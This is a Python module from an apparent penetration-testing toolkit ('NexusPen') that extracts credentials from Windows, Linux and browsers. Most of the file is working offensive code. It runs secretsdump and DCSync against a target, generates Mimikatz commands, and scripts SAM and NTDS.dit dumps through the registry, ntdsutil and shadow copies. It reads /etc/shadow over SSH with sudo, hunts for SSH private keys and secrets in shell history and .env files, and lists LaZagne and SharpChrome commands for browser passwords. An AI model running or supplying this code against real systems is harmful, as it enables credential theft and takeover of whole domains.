#!/usr/bin/env python3
"""
NexusPen - Hash Dumping Module
===============================
Credential and hash extraction from systems.
"""

import subprocess
import os
import re
from typing import Dict, List, Optional
from dataclasses import dataclass

from rich.console import Console
from rich.table import Table

console = Console()


@dataclass
class DumpedHash:
    """Dumped hash."""
    username: str
    hash_value: str
    hash_type: str
    source: str
    domain: Optional[str] = None
    rid: Optional[str] = None


class WindowsHashDumper:
    """
    Windows credential extraction.
    """
    
    def __init__(self, target: str = None, username: str = None,
                 password: str = None, hashes: str = None):
        self.target = target
        self.username = username
        self.password = password
        self.hashes = hashes  # LM:NTLM format
        self.dumped_hashes: List[DumpedHash] = []
    
    def _build_impacket_auth(self) -> str:
        """Build authentication string for Impacket."""
        if self.hashes:
            return f'{self.username}@{self.target} -hashes {self.hashes}'
        elif self.password:
            return f'{self.username}:{self.password}@{self.target}'
        else:
            return f'{self.username}@{self.target}'
    
    def secretsdump(self, method: str = 'all') -> List[DumpedHash]:
        """
        Dump secrets using Impacket's secretsdump.
        
        Args:
            method: Dump method (sam, lsa, ntds, dcsync, all)
        """
        console.print(f"\n[cyan]🔓 Running secretsdump ({method})...[/cyan]")
        
        cmd = ['secretsdump.py', self._build_impacket_auth()]
        
        if method == 'sam':
            cmd.append('-sam')
        elif method == 'lsa':
            cmd.append('-lsa')
        elif method == 'ntds':
            cmd.append('-ntds')
        
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            
            # Parse output
            for line in result.stdout.split('\n'):
                # SAM format: user:rid:lmhash:nthash:::
                if re.match(r'^[^:]+:\d+:[a-fA-F0-9]{32}:[a-fA-F0-9]{32}:::', line):
                    parts = line.split(':')
                    hash_obj = DumpedHash(
                        username=parts[0],
                        hash_value=f'{parts[2]}:{parts[3]}',
                        hash_type='NTLM',
                        source='SAM',
                        rid=parts[1]
                    )
                    self.dumped_hashes.append(hash_obj)
                    console.print(f"[green]  ✓ {parts[0]}:{parts[3][:8]}...[/green]")
                
                # NTDS format: domain\user:rid:lmhash:nthash:::
                elif re.match(r'^[^\\]+\\[^:]+:\d+:[a-fA-F0-9]{32}:[a-fA-F0-9]{32}:::', line):
                    parts = line.split(':')
                    domain_user = parts[0].split('\\')
                    hash_obj = DumpedHash(
                        username=domain_user[1],
                        hash_value=f'{parts[2]}:{parts[3]}',
                        hash_type='NTLM',
                        source='NTDS',
                        domain=domain_user[0],
                        rid=parts[1]
                    )
                    self.dumped_hashes.append(hash_obj)
                    console.print(f"[green]  ✓ {parts[0]}:{parts[3][:8]}...[/green]")
                    
        except Exception as e:
            console.print(f"[red]Error: {e}[/red]")
        
        return self.dumped_hashes
    
    def dcsync(self, target_user: str = 'Administrator') -> List[DumpedHash]:
        """Perform DCSync attack for specific user."""
        console.print(f"\n[cyan]🔓 DCSync for {target_user}...[/cyan]")
        
        cmd = ['secretsdump.py', '-just-dc-user', target_user, self._build_impacket_auth()]
        
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
            console.print(result.stdout)
        except Exception as e:
            console.print(f"[red]Error: {e}[/red]")
        
        return self.dumped_hashes
    
    def mimikatz_commands(self) -> Dict[str, str]:
        """Generate Mimikatz commands for credential extraction."""
        commands = {
            'sekurlsa_logonpasswords': 'privilege::debug\nsekurlsa::logonpasswords',
            'sekurlsa_wdigest': 'privilege::debug\nsekurlsa::wdigest',
            'lsadump_sam': 'privilege::debug\ntoken::elevate\nlsadump::sam',
            'lsadump_secrets': 'privilege::debug\ntoken::elevate\nlsadump::secrets',
            'lsadump_cache': 'privilege::debug\ntoken::elevate\nlsadump::cache',
            'lsadump_dcsync': f'lsadump::dcsync /domain:{self.target} /user:Administrator',
            'kerberos_tickets': 'privilege::debug\nsekurlsa::tickets /export',
            'vault_cred': 'privilege::debug\nvault::cred',
            'dpapi_masterkeys': 'privilege::debug\nsekurlsa::dpapi',
        }
        return commands
    
    def pypykatz_lsass(self, dump_file: str) -> str:
        """Parse LSASS dump with pypykatz."""
        console.print(f"\n[cyan]🔓 Parsing LSASS dump with pypykatz...[/cyan]")
        
        try:
            result = subprocess.run(
                ['pypykatz', 'lsa', 'minidump', dump_file],
                capture_output=True, text=True, timeout=120
            )
            return result.stdout
        except FileNotFoundError:
            console.print("[red]pypykatz not found[/red]")
            return ""
    
    def reg_sam(self) -> str:
        """Command to dump SAM from registry."""
        return '''
# Run on target Windows system as Admin:
reg save HKLM\\SAM sam.save
reg save HKLM\\SYSTEM system.save
reg save HKLM\\SECURITY security.save

# Transfer to attacker machine, then:
secretsdump.py -sam sam.save -system system.save -security security.save LOCAL
'''
    
    def ntdsutil(self) -> str:
        """Command to dump NTDS.dit."""
        return '''
# Run on Domain Controller:
ntdsutil "ac i ntds" "ifm" "create full C:\\temp" q q

# This creates NTDS.dit and SYSTEM copies
# Transfer to attacker, then:
secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL
'''
    
    def shadow_copy(self) -> str:
        """Commands to extract NTDS via shadow copy."""
        return '''
# On DC with admin:
# Create shadow copy
vssadmin create shadow /for=C:

# Copy NTDS.dit from shadow
copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\NTDS\\NTDS.dit C:\\temp\\ntds.dit

# Copy SYSTEM hive
copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SYSTEM C:\\temp\\system

# Delete shadow
vssadmin delete shadows /for=C: /quiet
'''


class LinuxHashDumper:
    """
    Linux credential extraction.
    """
    
    def __init__(self, target: str = None, ssh_creds: Dict = None):
        self.target = target
        self.ssh_creds = ssh_creds
    
    def dump_shadow(self) -> List[DumpedHash]:
        """Dump /etc/shadow."""
        console.print("\n[cyan]🔓 Dumping /etc/shadow...[/cyan]")
        
        hashes = []
        
        try:
            if self.target and self.ssh_creds:
                # Remote
                user = self.ssh_creds.get('username')
                if 'key' in self.ssh_creds:
                    cmd = f"ssh -i {self.ssh_creds['key']} {user}@{self.target} 'sudo cat /etc/shadow'"
                else:
                    password = self.ssh_creds.get('password')
                    cmd = f"sshpass -p '{password}' ssh {user}@{self.target} 'sudo cat /etc/shadow'"
                
                result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
                shadow_content = result.stdout
            else:
                # Local
                with open('/etc/shadow', 'r') as f:
                    shadow_content = f.read()
            
            for line in shadow_content.strip().split('\n'):
                if ':' in line:
                    parts = line.split(':')
                    if len(parts) >= 2 and parts[1] and parts[1] not in ['*', '!', '!!']:
                        hash_obj = DumpedHash(
                            username=parts[0],
                            hash_value=parts[1],
                            hash_type=self._identify_linux_hash(parts[1]),
                            source='/etc/shadow'
                        )
                        hashes.append(hash_obj)
                        console.print(f"[green]  ✓ {parts[0]}[/green]")
                        
        except Exception as e:
            console.print(f"[red]Error: {e}[/red]")
        
        return hashes
    
    def _identify_linux_hash(self, hash_value: str) -> str:
        """Identify Linux hash type."""
        if hash_value.startswith('$1$'):
            return 'MD5 Crypt'
        elif hash_value.startswith('$5$'):
            return 'SHA256 Crypt'
        elif hash_value.startswith('$6$'):
            return 'SHA512 Crypt'
        elif hash_value.startswith('$y$'):
            return 'Yescrypt'
        elif hash_value.startswith('$2'):
            return 'Bcrypt'
        else:
            return 'Unknown'
    
    def find_ssh_keys(self) -> List[str]:
        """Find SSH private keys."""
        console.print("\n[cyan]🔑 Finding SSH keys...[/cyan]")
        
        keys = []
        locations = [
            '/root/.ssh/id_rsa',
            '/root/.ssh/id_ed25519',
            '/home/*/.ssh/id_rsa',
            '/home/*/.ssh/id_ed25519',
        ]
        
        result = subprocess.run(
            ['find', '/', '-name', 'id_rsa', '-o', '-name', 'id_ed25519'],
            capture_output=True, text=True, timeout=60
        )
        
        for key_path in result.stdout.strip().split('\n'):
            if key_path:
                keys.append(key_path)
                console.print(f"[green]  📄 {key_path}[/green]")
        
        return keys
    
    def find_credentials_in_files(self) -> Dict[str, List[str]]:
        """Search for credentials in common locations."""
        console.print("\n[cyan]🔍 Searching for credentials...[/cyan]")
        
        findings = {
            'history': [],
            'config_files': [],
            'env_files': [],
        }
        
        # Bash history
        history_files = subprocess.run(
            ['find', '/', '-name', '.bash_history', '-o', '-name', '.zsh_history'],
            capture_output=True, text=True, timeout=30
        ).stdout.strip().split('\n')
        
        for hist_file in history_files:
            if hist_file and os.path.exists(hist_file):
                try:
                    with open(hist_file, 'r', errors='ignore') as f:
                        for line in f:
                            if any(kw in line.lower() for kw in ['pass', 'pwd', 'secret', 'key', 'token']):
                                findings['history'].append(line.strip())
                except:
                    pass
        
        # .env files
        env_files = subprocess.run(
            ['find', '/', '-name', '.env', '-o', '-name', 'config.php', '-o', '-name', 'wp-config.php'],
            capture_output=True, text=True, timeout=30
        ).stdout.strip().split('\n')
        
        for env_file in env_files:
            if env_file:
                findings['env_files'].append(env_file)
                console.print(f"[yellow]  📄 {env_file}[/yellow]")
        
        return findings


class BrowserCredentialDumper:
    """
    Browser credential extraction.
    """
    
    def chrome_passwords(self) -> str:
        """Commands to extract Chrome passwords."""
        return '''
# On Windows (requires decryption key from DPAPI):
# Use tools like:
# - SharpChrome
# - lazagne
# - mimikatz

# Chrome password file locations:
# Windows: %LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Login Data
# Linux: ~/.config/google-chrome/Default/Login Data
# macOS: ~/Library/Application Support/Google/Chrome/Default/Login Data

# Using lazagne:
lazagne.exe browsers -chrome

# Using SharpChrome:
SharpChrome.exe logins
'''
    
    def firefox_passwords(self) -> str:
        """Commands to extract Firefox passwords."""
        return '''
# Firefox stores credentials in:
# Windows: %APPDATA%\\Mozilla\\Firefox\\Profiles\\*.default\\
# Linux: ~/.mozilla/firefox/*.default/
# Files: logins.json, key4.db

# Using lazagne:
lazagne.exe browsers -firefox

# Using firefox_decrypt:
python firefox_decrypt.py ~/.mozilla/firefox/
'''
    
    def all_browsers(self) -> str:
        """Extract from all browsers using lazagne."""
        return '''
# LaZagne - extract all browser credentials
lazagne.exe browsers

# Or specific:
lazagne.exe browsers -chrome
lazagne.exe browsers -firefox
lazagne.exe browsers -edge
'''


class CredentialFileParser:
    """
    Parse various credential file formats.
    """
    
    @staticmethod
    def parse_pwdump(file_path: str) -> List[DumpedHash]:
        """Parse PWDUMP format file."""
        hashes = []
        
        # Format: user:id:lmhash:nthash:::
        with open(file_path, 'r') as f:
            for line in f:
                if ':' in line:
                    parts = line.strip().split(':')
                    if len(parts) >= 4:
                        hashes.append(DumpedHash(
                            username=parts[0],
                            hash_value=f'{parts[2]}:{parts[3]}',
                            hash_type='NTLM',
                            source='PWDUMP',
                            rid=parts[1]
                        ))
        
        return hashes
    
    @staticmethod
    def parse_hashdump(file_path: str) -> List[DumpedHash]:
        """Parse Metasploit hashdump format."""
        return CredentialFileParser.parse_pwdump(file_path)
    
    @staticmethod
    def parse_shadow(file_path: str) -> List[DumpedHash]:
        """Parse Linux shadow file."""
        hashes = []
        
        with open(file_path, 'r') as f:
            for line in f:
                parts = line.strip().split(':')
                if len(parts) >= 2 and parts[1] and parts[1] not in ['*', '!', '!!', '']:
                    hashes.append(DumpedHash(
                        username=parts[0],
                        hash_value=parts[1],
                        hash_type='Linux',
                        source='shadow'
                    ))
        
        return hashes
    
    @staticmethod
    def parse_ntds(file_path: str) -> List[DumpedHash]:
        """Parse NTDS.dit secretsdump output."""
        hashes = []
        
        with open(file_path, 'r') as f:
            for line in f:
                # Format: domain\user:rid:lmhash:nthash:::
                if '\\' in line and ':' in line:
                    parts = line.strip().split(':')
                    if len(parts) >= 4 and re.match(r'^[a-fA-F0-9]{32}$', parts[3]):
                        domain_user = parts[0].split('\\')
                        hashes.append(DumpedHash(
                            username=domain_user[1] if len(domain_user) > 1 else domain_user[0],
                            hash_value=parts[3],
                            hash_type='NTLM',
                            source='NTDS',
                            domain=domain_user[0] if len(domain_user) > 1 else None,
                            rid=parts[1]
                        ))
        
        return hashes


def display_dump_methods():
    """Display all credential dumping methods."""
    console.print("\n[bold cyan]═══════════════════════════════════════════════════════════[/bold cyan]")
    console.print("[bold cyan]              CREDENTIAL DUMPING METHODS                    [/bold cyan]")
    console.print("[bold cyan]═══════════════════════════════════════════════════════════[/bold cyan]")
    
    methods = {
        'Windows': ['secretsdump', 'DCSync', 'Mimikatz', 'pypykatz', 'reg save', 'Shadow Copy'],
        'Linux': ['/etc/shadow', 'SSH keys', 'Bash history', '.env files'],
        'Browsers': ['Chrome', 'Firefox', 'Edge', 'LaZagne'],
        'Network': ['Responder', 'ntlmrelayx', 'PCredz'],
    }
    
    table = Table(title="Dumping Methods", show_header=True,
                 header_style="bold magenta")
    table.add_column("Platform", style="cyan", width=15)
    table.add_column("Methods", style="white")
    
    for platform, method_list in methods.items():
        table.add_row(platform, ', '.join(method_list))
    
    console.print(table)
